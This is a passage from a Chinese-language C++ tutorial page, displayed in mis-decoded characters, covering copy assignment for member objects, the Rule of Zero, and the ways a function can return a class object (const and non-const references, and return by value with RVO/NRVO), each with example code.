(é»˜è®¤èµ‹å€¼è¿ç®—ç¬¦):</strong></p><ul><li>  ç¼–è¯‘å™¨ç”Ÿæˆçš„ <code>Gadget</code> èµ‹å€¼è¿ç®—ç¬¦ä¼šæ‰§è¡Œæˆå‘˜é€ä¸€èµ‹å€¼ã€‚</li><li>  å¯¹äº <code>int id</code> æˆå‘˜ï¼š<code>g3.id</code> è¢«è®¾ç½®ä¸º <code>g1.id</code> çš„å€¼ã€‚</li><li>  å¯¹äº <code>String name</code> æˆå‘˜ï¼šè°ƒç”¨ <code>String</code> ç±»çš„<strong>èµ‹å€¼è¿ç®—ç¬¦</strong> <code>operator=(const String&amp;)</code>ï¼Œå°† <code>g1.name</code> èµ‹ç»™ <code>g3.name</code> (<code>g3.name = g1.name;</code>)ã€‚å› ä¸º <code>String</code> ç±»æœ‰æ­£ç¡®çš„æ·±å¤åˆ¶èµ‹å€¼è¿ç®—ç¬¦ï¼ˆå®ƒä¼šå…ˆé‡Šæ”¾ <code>g3.name</code> çš„æ—§å†…å­˜ï¼Œç„¶ååˆ†é…æ–°å†…å­˜å¹¶å¤åˆ¶å†…å®¹ï¼‰ï¼Œæ‰€ä»¥èµ‹å€¼æ“ä½œæ˜¯å®‰å…¨çš„ã€‚</li></ul></li></ol><p><strong>ç»“è®º:</strong></p><p>å¦‚æœä¸€ä¸ªç±»åŒ…å«å…¶ä»–ç±»çš„å¯¹è±¡ä½œä¸ºæˆå‘˜ï¼Œå¹¶ä¸”è¿™äº›æˆå‘˜å¯¹è±¡æ‰€å±çš„ç±»<strong>å·²ç»æ­£ç¡®åœ°å®ç°äº†å®ƒä»¬è‡ªå·±çš„å¤åˆ¶æ§åˆ¶</strong>ï¼ˆå³å®ƒä»¬èƒ½å®‰å…¨åœ°è¿›è¡Œæ·±å¤åˆ¶å’Œå†…å­˜ç®¡ç†ï¼Œåƒæˆ‘ä»¬çš„ <code>String</code> ç±»æˆ–æ ‡å‡†åº“ç±» <code>std::string</code>, <code>std::vector</code> ç­‰ï¼‰ï¼Œé‚£ä¹ˆå¯¹äºè¿™äº›æˆå‘˜æ¥è¯´ï¼ŒåŒ…å«ç±»çš„é»˜è®¤æˆå‘˜é€ä¸€å¤åˆ¶è¡Œä¸ºé€šå¸¸æ˜¯<strong>è¶³å¤Ÿä¸”å®‰å…¨</strong>çš„ã€‚</p><p>ä½†æ˜¯ï¼Œå¦‚æœåŒ…å«ç±»<strong>æœ¬èº«</strong>è¿˜ç›´æ¥ç®¡ç†<strong>å…¶ä»–</strong>åŠ¨æ€å†…å­˜ï¼ˆä¾‹å¦‚ï¼Œ<code>Gadget</code> ç±»é™¤äº† <code>String name</code> ä¹‹å¤–ï¼Œè¿˜æœ‰ä¸€ä¸ª <code>int* extra_data</code> æŒ‡é’ˆï¼Œå¹¶ä¸” <code>Gadget</code> è´Ÿè´£ <code>new/delete</code> è¿™ä¸ªæŒ‡é’ˆï¼‰ï¼Œé‚£ä¹ˆè¿™ä¸ªåŒ…å«ç±»<strong>ä»ç„¶éœ€è¦</strong>æä¾›è‡ªå·±çš„è‡ªå®šä¹‰å¤åˆ¶æ„é€ å‡½æ•°å’Œèµ‹å€¼è¿ç®—ç¬¦æ¥å¤„ç† <code>extra_data</code> çš„æ·±å¤åˆ¶ï¼Œå³ä½¿ <code>String name</code> æˆå‘˜çš„å¤åˆ¶å¯ä»¥ç”± <code>String</code> ç±»è‡ªå·±å¤„ç†ã€‚</p><p>è¿™å°±æ˜¯<strong>é›¶æ³•åˆ™ (Rule of Zero)</strong> å‘æŒ¥ä½œç”¨çš„åœ°æ–¹ï¼šå¦‚æœä½ çš„ç±»åªä½¿ç”¨é‚£äº›è‡ªèº«èƒ½æ­£ç¡®ç®¡ç†èµ„æºçš„æˆå‘˜ï¼ˆå¦‚ <code>std::string</code>, <code>std::vector</code>, <code>std::unique_ptr</code> ç­‰ï¼‰ï¼Œå¹¶ä¸”ä¸ç›´æ¥è¿›è¡Œæ‰‹åŠ¨çš„ <code>new/delete</code>ï¼Œé‚£ä¹ˆä½ é€šå¸¸ä¸éœ€è¦æä¾›ä»»ä½•è‡ªå®šä¹‰çš„ææ„å‡½æ•°ã€å¤åˆ¶/ç§»åŠ¨æ„é€ å‡½æ•°æˆ–èµ‹å€¼è¿ç®—ç¬¦ï¼Œç¼–è¯‘å™¨ç”Ÿæˆçš„é»˜è®¤ç‰ˆæœ¬å°±èƒ½å¾ˆå¥½åœ°å·¥ä½œã€‚</p><h2 id="12-4-æœ‰å…³è¿”å›å¯¹è±¡çš„è¯´æ˜"><a href="#12-4-æœ‰å…³è¿”å›å¯¹è±¡çš„è¯´æ˜" class="headerlink" title="12.4 æœ‰å…³è¿”å›å¯¹è±¡çš„è¯´æ˜"></a>12.4 æœ‰å…³è¿”å›å¯¹è±¡çš„è¯´æ˜</h2><p>å½“å‡½æ•°æˆ–æ–¹æ³•éœ€è¦è¿”å›ä¸€ä¸ªç±»å¯¹è±¡æ—¶ï¼Œæœ‰å‡ ç§ä¸åŒçš„æ–¹å¼å¯ä»¥å®ç°ï¼Œæ¯ç§æ–¹å¼éƒ½æœ‰å…¶é€‚ç”¨çš„åœºæ™¯å’Œæ½œåœ¨çš„æ•ˆç‡æˆ–å®‰å…¨ implicationsã€‚ä¸»è¦çš„æ–¹å¼åŒ…æ‹¬ï¼šè¿”å›æŒ‡å‘å¯¹è±¡çš„å¼•ç”¨ï¼ˆ<code>const</code> æˆ–é <code>const</code>ï¼‰å’Œè¿”å›å¯¹è±¡æœ¬èº«ï¼ˆæŒ‰å€¼è¿”å›ï¼Œ<code>const</code> æˆ–é <code>const</code>ï¼‰ã€‚</p><h3 id="12-4-1-è¿”å›æŒ‡å‘-const-å¯¹è±¡çš„å¼•ç”¨"><a href="#12-4-1-è¿”å›æŒ‡å‘-const-å¯¹è±¡çš„å¼•ç”¨" class="headerlink" title="12.4.1 è¿”å›æŒ‡å‘ const å¯¹è±¡çš„å¼•ç”¨"></a>12.4.1 è¿”å›æŒ‡å‘ const å¯¹è±¡çš„å¼•ç”¨</h3><p><strong>è¯­æ³•:</strong> <code>const ClassName &amp; functionName(parameters);</code></p><p><strong>ä½•æ—¶ä½¿ç”¨:</strong><br>å½“å‡½æ•°éœ€è¦è¿”å›ä¸€ä¸ª<strong>å·²ç»å­˜åœ¨</strong>çš„å¯¹è±¡ï¼ˆä¾‹å¦‚ï¼Œç±»çš„æˆå‘˜ã€é€šè¿‡å¼•ç”¨ä¼ é€’ç»™å‡½æ•°çš„å¯¹è±¡ï¼‰ï¼Œå¹¶ä¸”<strong>ä¸å¸Œæœ›</strong>è°ƒç”¨è€…é€šè¿‡è¿”å›çš„å¼•ç”¨ä¿®æ”¹è¿™ä¸ªå¯¹è±¡æ—¶ã€‚</p><p><strong>ä¼˜ç‚¹:</strong></p><ul><li>  <strong>é«˜æ•ˆ:</strong> é¿å…äº†åˆ›å»ºå¯¹è±¡çš„å‰¯æœ¬ã€‚è¿”å›çš„åªæ˜¯å¯¹è±¡çš„åœ°å€ï¼ˆå¼•ç”¨ï¼‰ã€‚</li><li>  <strong>å®‰å…¨:</strong> <code>const</code> ä¿è¯äº†è°ƒç”¨è€…ä¸èƒ½æ„å¤–åœ°ä¿®æ”¹è¿”å›çš„å¯¹è±¡ã€‚</li></ul><p><strong>ç¼ºç‚¹/æ³¨æ„äº‹é¡¹:</strong></p><ul><li>  <strong>ä¸èƒ½è¿”å›å±€éƒ¨å¯¹è±¡çš„å¼•ç”¨:</strong> å‡½æ•°ä¸èƒ½è¿”å›åœ¨å‡½æ•°å†…éƒ¨åˆ›å»ºçš„å±€éƒ¨å˜é‡çš„å¼•ç”¨ã€‚å½“å‡½æ•°ç»“æŸæ—¶ï¼Œå±€éƒ¨å˜é‡ä¼šè¢«é”€æ¯ï¼Œè¿”å›çš„å¼•ç”¨å°†æˆä¸º**æ‚¬æŒ‚å¼•ç”¨ (dangling reference)**ï¼Œè®¿é—®å®ƒä¼šå¯¼è‡´æœªå®šä¹‰è¡Œä¸ºã€‚</li><li>  è¿”å›çš„å¯¹è±¡å¿…é¡»åœ¨å‡½æ•°è°ƒç”¨ç»“æŸåä»ç„¶å­˜åœ¨ã€‚</li></ul><p><strong>ç¤ºä¾‹:</strong><br>å‡è®¾æˆ‘ä»¬æœ‰ä¸€ä¸ª <code>Store</code> ç±»ï¼ŒåŒ…å«å¤šä¸ª <code>Product</code> å¯¹è±¡ï¼Œæˆ‘ä»¬æƒ³æä¾›ä¸€ä¸ªæ–¹æ³•æ¥é€šè¿‡ ID è·å–æŸä¸ªäº§å“çš„ä¿¡æ¯ï¼Œä½†ä¸å…è®¸ä¿®æ”¹å®ƒã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Product</span> &#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> name;</span><br><span class="line">    <span class="keyword">double</span> price;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    Product(<span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span>&amp; n = <span class="string">&quot;N/A&quot;</span>, <span class="keyword">double</span> p = <span class="number">0.0</span>) : name(n), price(p) &#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">show</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; name &lt;&lt; <span class="string">&quot;: $&quot;</span> &lt;&lt; price; &#125;</span><br><span class="line">    <span class="comment">// ... å…¶ä»–æ–¹æ³• ...</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Store</span> &#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;Product&gt; products;</span><br><span class="line">    Product defaultProduct; <span class="comment">// ç”¨äºæ‰¾ä¸åˆ°æ—¶è¿”å›</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// ... æ–¹æ³•æ·»åŠ äº§å“ ...</span></span><br><span class="line">    <span class="comment">// é€šè¿‡ ID æŸ¥æ‰¾äº§å“ï¼Œè¿”å› const å¼•ç”¨</span></span><br><span class="line">    <span class="function"><span class="keyword">const</span> Product &amp; <span class="title">findProductById</span><span class="params">(<span class="keyword">int</span> id)</span> <span class="keyword">const</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (id &gt;= <span class="number">0</span> &amp;&amp; id &lt; products.size()) &#123;</span><br><span class="line">            <span class="keyword">return</span> products[id]; <span class="comment">// è¿”å› vector ä¸­å·²å­˜åœ¨å¯¹è±¡çš„ const å¼•ç”¨</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> defaultProduct; <span class="comment">// è¿”å›ä¸€ä¸ªå·²å­˜åœ¨çš„é»˜è®¤å¯¹è±¡çš„ const å¼•ç”¨</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// é”™è¯¯ç¤ºä¾‹ï¼š</span></span><br><span class="line">        <span class="comment">// Product temp(&quot;Temporary&quot;, 0.0);</span></span><br><span class="line">        <span class="comment">// return temp; // é”™è¯¯ï¼ä¸èƒ½è¿”å›å±€éƒ¨å˜é‡çš„å¼•ç”¨</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Store myStore;</span><br><span class="line">    <span class="comment">// ... æ·»åŠ äº§å“åˆ° myStore ...</span></span><br><span class="line">    <span class="keyword">const</span> Product &amp; found = myStore.findProductById(<span class="number">1</span>); <span class="comment">// é«˜æ•ˆï¼Œæ— å¤åˆ¶</span></span><br><span class="line">    found.show(); <span class="comment">// OK: è°ƒç”¨ const æ–¹æ³•</span></span><br><span class="line">    <span class="comment">// found.setPrice(9.99); // é”™è¯¯ï¼ä¸èƒ½é€šè¿‡ const å¼•ç”¨è°ƒç”¨é const æ–¹æ³•</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="12-4-2-è¿”å›æŒ‡å‘é-const-å¯¹è±¡çš„å¼•ç”¨"><a href="#12-4-2-è¿”å›æŒ‡å‘é-const-å¯¹è±¡çš„å¼•ç”¨" class="headerlink" title="12.4.2 è¿”å›æŒ‡å‘é const å¯¹è±¡çš„å¼•ç”¨"></a>12.4.2 è¿”å›æŒ‡å‘é const å¯¹è±¡çš„å¼•ç”¨</h3><p><strong>è¯­æ³•:</strong> <code>ClassName &amp; functionName(parameters);</code></p><p><strong>ä½•æ—¶ä½¿ç”¨:</strong><br>å½“å‡½æ•°éœ€è¦è¿”å›ä¸€ä¸ª<strong>å·²ç»å­˜åœ¨</strong>çš„å¯¹è±¡ï¼Œå¹¶ä¸”<strong>å…è®¸</strong>è°ƒç”¨è€…é€šè¿‡è¿”å›çš„å¼•ç”¨<strong>ä¿®æ”¹</strong>è¿™ä¸ªå¯¹è±¡æ—¶ã€‚æœ€å¸¸è§çš„ä¾‹å­æ˜¯é‡è½½æŸäº›è¿ç®—ç¬¦ï¼Œå¦‚ <code>[]</code> (ä¸‹æ ‡) æˆ– <code>+=</code> (å¤åˆèµ‹å€¼)ã€‚</p><p><strong>ä¼˜ç‚¹:</strong></p><ul><li>  <strong>é«˜æ•ˆ:</strong> åŒæ ·é¿å…äº†åˆ›å»ºå¯¹è±¡çš„å‰¯æœ¬ã€‚</li><li>  <strong>å…è®¸ä¿®æ”¹:</strong> å¯ä»¥ç”¨äºå®ç°é“¾å¼è°ƒç”¨æˆ–å…è®¸ç›´æ¥ä¿®æ”¹è¿”å›çš„å¯¹è±¡ã€‚</li></ul><p><strong>ç¼ºç‚¹/æ³¨æ„äº‹é¡¹:</strong></p><ul><li>  <strong>ä¸èƒ½è¿”å›å±€éƒ¨å¯¹è±¡çš„å¼•ç”¨:</strong> ä¸è¿”å› <code>const</code> å¼•ç”¨ä¸€æ ·ï¼Œç»å¯¹ä¸èƒ½è¿”å›å‡½æ•°å†…éƒ¨å±€éƒ¨å˜é‡çš„å¼•ç”¨ã€‚</li><li>  <strong>ç ´åå°è£… (å¯èƒ½):</strong> å¦‚æœè¿”å›çš„æ˜¯ç±»å†…éƒ¨ç§æœ‰æˆå‘˜çš„é <code>const</code> å¼•ç”¨ï¼Œå¯èƒ½ä¼šç ´åç±»çš„å°è£…æ€§ï¼Œå…è®¸å¤–éƒ¨ä»£ç ç›´æ¥ä¿®æ”¹å†…éƒ¨çŠ¶æ€ï¼Œåº”è°¨æ…ä½¿ç”¨ã€‚</li></ul><p><strong>ç¤ºä¾‹:</strong><br>é‡è½½ <code>String</code> ç±»çš„ä¸‹æ ‡è¿ç®—ç¬¦ <code>[]</code>ï¼Œå…è®¸ä¿®æ”¹å­—ç¬¦ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// åœ¨ String ç±»ä¸­ (æ¥è‡ª string1.h)</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">String</span> &#123;</span></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="comment">// è¿”å›é const å¼•ç”¨ï¼Œå…è®¸ä¿®æ”¹</span></span><br><span class="line">    <span class="keyword">char</span> &amp; <span class="keyword">operator</span>[](<span class="keyword">int</span> i);</span><br><span class="line">    <span class="comment">// è¿”å› const å¼•ç”¨ï¼Œç”¨äº const å¯¹è±¡</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> &amp; <span class="keyword">operator</span>[](<span class="keyword">int</span> i) <span class="keyword">const</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å®ç°</span></span><br><span class="line"><span class="keyword">char</span> &amp; String::<span class="keyword">operator</span>[](<span class="keyword">int</span> i) &#123;</span><br><span class="line">    <span class="keyword">return</span> str[i]; <span class="comment">// è¿”å›å†…éƒ¨ char æ•°ç»„å…ƒç´ çš„å¼•ç”¨</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> &amp; String::<span class="keyword">operator</span>[](<span class="keyword">int</span> i) <span class="keyword">const</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> str[i];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ä½¿ç”¨</span></span><br><span class="line"><span class="function">String <span class="title">greeting</span><span class="params">(<span class="string">&quot;Hello&quot;</span>)</span></span>;</span><br><span class="line">greeting[<span class="number">0</span>] = <span class="string">&#x27;J&#x27;</span>; <span class="comment">// OK: é€šè¿‡è¿”å›çš„å¼•ç”¨ä¿®æ”¹äº†ç¬¬ä¸€ä¸ªå­—ç¬¦</span></span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; greeting &lt;&lt; <span class="built_in">endl</span>; <span class="comment">// è¾“å‡º Jello</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">const</span> String <span class="title">constGreeting</span><span class="params">(<span class="string">&quot;Hi&quot;</span>)</span></span>;</span><br><span class="line"><span class="keyword">char</span> firstChar = constGreeting[<span class="number">0</span>]; <span class="comment">// OK: è¯»å–å­—ç¬¦</span></span><br><span class="line"><span class="comment">// constGreeting[0] = &#x27;B&#x27;; // é”™è¯¯ï¼ä¸èƒ½ä¿®æ”¹ const å¯¹è±¡</span></span><br></pre></td></tr></table></figure><p>å¦ä¸€ä¸ªä¾‹å­æ˜¯ <code>operator+=</code>ï¼Œå®ƒä¿®æ”¹å¯¹è±¡è‡ªèº«å¹¶è¿”å›è‡ªèº«çš„å¼•ç”¨ä»¥æ”¯æŒé“¾å¼æ“ä½œï¼ˆè™½ç„¶é“¾å¼èµ‹å€¼ä¸å¸¸è§ï¼‰ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// åœ¨ Time ç±»ä¸­</span></span><br><span class="line">Time&amp; Time::<span class="keyword">operator</span>+=(<span class="keyword">const</span> Time&amp; t) &#123;</span><br><span class="line">    <span class="comment">// ... å®ç°åŠ æ³•é€»è¾‘ï¼Œä¿®æ”¹ *this ...</span></span><br><span class="line">    <span class="keyword">return</span> *<span class="keyword">this</span>; <span class="comment">// è¿”å›è°ƒç”¨å¯¹è±¡è‡ªèº«çš„å¼•ç”¨</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="12-4-3-è¿”å›å¯¹è±¡-æŒ‰å€¼è¿”å›"><a href="#12-4-3-è¿”å›å¯¹è±¡-æŒ‰å€¼è¿”å›" class="headerlink" title="12.4.3 è¿”å›å¯¹è±¡ (æŒ‰å€¼è¿”å›)"></a>12.4.3 è¿”å›å¯¹è±¡ (æŒ‰å€¼è¿”å›)</h3><p><strong>è¯­æ³•:</strong> <code>ClassName functionName(parameters);</code></p><p><strong>ä½•æ—¶ä½¿ç”¨:</strong><br>å½“å‡½æ•°éœ€è¦è¿”å›ä¸€ä¸ª<strong>æ–°åˆ›å»ºçš„å¯¹è±¡</strong>ï¼ˆåœ¨å‡½æ•°å†…éƒ¨è®¡ç®—æˆ–æ„é€ å¾—åˆ°ï¼‰ï¼Œæˆ–è€…éœ€è¦è¿”å›ä¸€ä¸ªç°æœ‰å¯¹è±¡çš„<strong>å‰¯æœ¬</strong>è€Œä¸æ˜¯å…¶æœ¬èº«æ—¶ã€‚è¿™æ˜¯æœ€å¸¸è§å’Œæœ€å®‰å…¨çš„è¿”å›å¯¹è±¡çš„æ–¹å¼ï¼Œç‰¹åˆ«æ˜¯å¯¹äºå±€éƒ¨å¯¹è±¡ã€‚</p><p><strong>ä¼˜ç‚¹:</strong></p><ul><li>  <strong>å®‰å…¨:</strong> ä¸ä¼šè¿”å›æ‚¬æŒ‚å¼•ç”¨ã€‚è¿”å›çš„æ˜¯ä¸€ä¸ªç‹¬ç«‹çš„å‰¯æœ¬ï¼ˆæˆ–ç§»åŠ¨åçš„å¯¹è±¡ï¼‰ã€‚</li><li>  <strong>ç®€å•:</strong> æ˜“äºç†è§£å’Œå®ç°ã€‚</li></ul><p><strong>ç¼ºç‚¹/æ³¨æ„äº‹é¡¹:</strong></p><ul><li>  <strong>å¯èƒ½æœ‰æ•ˆç‡å¼€é”€:</strong> ä¼ ç»Ÿä¸Šï¼ŒæŒ‰å€¼è¿”å›ä¼šè°ƒç”¨<strong>å¤åˆ¶æ„é€ å‡½æ•°</strong>æ¥åˆ›å»ºè¿”å›å€¼çš„å‰¯æœ¬ï¼Œè¿™å¯èƒ½æ¶‰åŠå¤§é‡æ•°æ®çš„å¤åˆ¶å’Œå†…å­˜åˆ†é…/é‡Šæ”¾ï¼Œæ•ˆç‡è¾ƒä½ã€‚</li><li>  <strong>è¿”å›å€¼ä¼˜åŒ– (RVO/NRVO):</strong> ç°ä»£ C++ ç¼–è¯‘å™¨é€šå¸¸ä¼šåº”ç”¨<strong>è¿”å›å€¼ä¼˜åŒ– (Return Value Optimization, RVO)</strong> æˆ–<strong>å‘½åè¿”å›å€¼ä¼˜åŒ– (Named Return Value Optimization, NRVO)**ã€‚è¿™äº›ä¼˜åŒ–å¯ä»¥</strong>å®Œå…¨é¿å…**å¤åˆ¶æ„é€ å‡½æ•°çš„è°ƒç”¨ï¼Œç›´æ¥åœ¨è°ƒç”¨è€…æŒ‡å®šçš„å†…å­˜ä½ç½®ä¸Šæ„é€ è¿”å›çš„å¯¹è±¡ï¼Œä»è€Œå¤§å¤§æé«˜æŒ‰å€¼è¿”å›çš„æ•ˆç‡ã€‚</li><li>  <strong>ç§»åŠ¨è¯­ä¹‰ (C++11):</strong> å¦‚æœ RVO/NRVO ä¸é€‚ç”¨ï¼Œä½†ç±»æœ‰<strong>ç§»åŠ¨æ„é€ å‡½æ•°</strong>ï¼Œç¼–è¯‘å™¨å¯èƒ½ä¼šé€‰æ‹©è°ƒç”¨ç§»åŠ¨æ„é€ å‡½æ•°è€Œä¸æ˜¯å¤åˆ¶æ„é€ å‡½æ•°æ¥è½¬ç§»èµ„æºæ‰€æœ‰æƒï¼Œè¿™ä¹Ÿæ¯”æ·±å¤åˆ¶é«˜æ•ˆå¾—å¤šã€‚</li></ul><p><strong>ç¤ºä¾‹:</strong><br>é‡è½½ <code>Vector</code> ç±»çš„ <code>+</code> è¿ç®—ç¬¦ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// åœ¨ Vector ç±»ä¸­</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Vector</span> &#123;</span></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="comment">// æŒ‰å€¼è¿”å›ä¸€ä¸ªæ–°çš„ Vector å¯¹è±¡</span></span><br><span class="line">    Vector <span class="keyword">operator</span>+(<span class="keyword">const</span> Vector &amp; b) <span class="keyword">const</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å®ç°</span></span><br><span class="line">Vector Vector::<span class="keyword">operator</span>+(<span class="keyword">const</span> Vector &amp; b) <span class="keyword">const</span> &#123;</span><br><span class="line">    <span class="comment">// æ–¹æ³• 1: åˆ›å»ºå‘½åå¯¹è±¡å¹¶è¿”å› (å¯èƒ½è§¦å‘ NRVO)</span></span><br><span class="line">    <span class="function">Vector <span class="title">sum</span><span class="params">(x + b.x, y + b.y)</span></span>;</span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ–¹æ³• 2: ç›´æ¥è¿”å›ä¸´æ—¶å¯¹è±¡ (å¯èƒ½è§¦å‘ RVO)</span></span><br><span class="line">    <span class="comment">// return Vector(x + b.x, y + b.y);</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ä½¿ç”¨</span></span><br><span class="line">Vector v1(1, 2), v2(3, 4);</span><br><span class="line">Vector v3 = v1 + v2; <span class="comment">// v1 + v2 è¿”å›ä¸€ä¸ªä¸´æ—¶ Vector å¯¹è±¡</span></span><br><span class="line">                     <span class="comment">// è¿™ä¸ªä¸´æ—¶å¯¹è±¡è¢«ç”¨æ¥åˆå§‹åŒ– v3 (å¯èƒ½é€šè¿‡ RVO/NRVO æˆ–ç§»åŠ¨/å¤åˆ¶æ„é€ )</span></span><br></pre></td></tr></table></figure><p>ç”±äº RVO/NRVO å’Œç§»åŠ¨è¯­ä¹‰çš„å­˜åœ¨ï¼ŒæŒ‰å€¼è¿”å›åœ¨ç°ä»£ C++ ä¸­é€šå¸¸æ˜¯é«˜æ•ˆä¸”æ¨èçš„æ–¹å¼ï¼Œç‰¹åˆ«æ˜¯å¯¹äºé‚£äº›è¡¨ç¤ºâ€œå€¼â€è€Œéâ€œèº«ä»½â€çš„ç±»å‹ã€‚</p><h3 id="12-4-4-è¿”å›-const-å¯¹è±¡-æŒ‰å€¼è¿”å›"><a href="#12-4-4-è¿”å›-const-å¯¹è±¡-æŒ‰å€¼è¿”å›" class="headerlink" title="12.4.4 è¿”å› const å¯¹è±¡ (æŒ‰å€¼è¿”å›)"></a>12.4.4 è¿”å› const å¯¹è±¡ (æŒ‰å€¼è¿”å›)</h3><p><strong>è¯­æ³•:</strong> <code>const ClassName functionName(parameters);</code></p><p><strong>ä½•æ—¶ä½¿ç”¨:</strong><br>è¿™æ˜¯ä¸€ç§ä¸å¤ªå¸¸è§çš„è¿”å›æ–¹å¼ã€‚å®ƒæŒ‰å€¼è¿”å›ä¸€ä¸ªå¯¹è±¡ï¼Œä½†è¿™ä¸ªè¿”å›çš„ä¸´æ—¶å¯¹è±¡æ˜¯ <code>const</code> çš„ã€‚</p><p><strong>ä¼˜ç‚¹:</strong></p><ul><li>  <strong>é˜»æ­¢å¯¹è¿”å›çš„ä¸´æ—¶å¯¹è±¡è°ƒç”¨é const æ–¹æ³•:</strong> å¦‚æœä¸€ä¸ªå‡½æ•°æŒ‰å€¼è¿”å›ä¸€ä¸ªå¯¹è±¡ï¼Œè°ƒç”¨è€…å¯ä»¥ç«‹å³å¯¹è¿™ä¸ªè¿”å›çš„ä¸´æ—¶å¯¹è±¡è°ƒç”¨å…¶æˆå‘˜å‡½æ•°ã€‚å¦‚æœè¿”å›ç±»å‹æ˜¯ <code>const ClassName</code>ï¼Œåˆ™åªèƒ½è°ƒç”¨è¯¥å¯¹è±¡çš„ <code>const</code> æˆå‘˜å‡½æ•°ã€‚</li></ul><p><strong>ç¼ºç‚¹/æ³¨æ„äº‹é¡¹:</strong></p><ul><li>  <strong>é€šå¸¸æ„ä¹‰ä¸å¤§:</strong> å¯¹äºç±»ç±»å‹ï¼Œå°†æŒ‰å€¼è¿”å›çš„å¯¹è±¡å£°æ˜ä¸º <code>const</code> é€šå¸¸æ²¡ä»€ä¹ˆå¿…è¦ã€‚å› ä¸ºè¿”å›çš„æ˜¯ä¸€ä¸ªä¸´æ—¶å¯¹è±¡ï¼ˆå³å€¼ï¼‰ï¼Œå¯¹å…¶è¿›è¡Œä¿®æ”¹é€šå¸¸æ²¡æœ‰æ„ä¹‰ï¼Œè€Œä¸” C++11 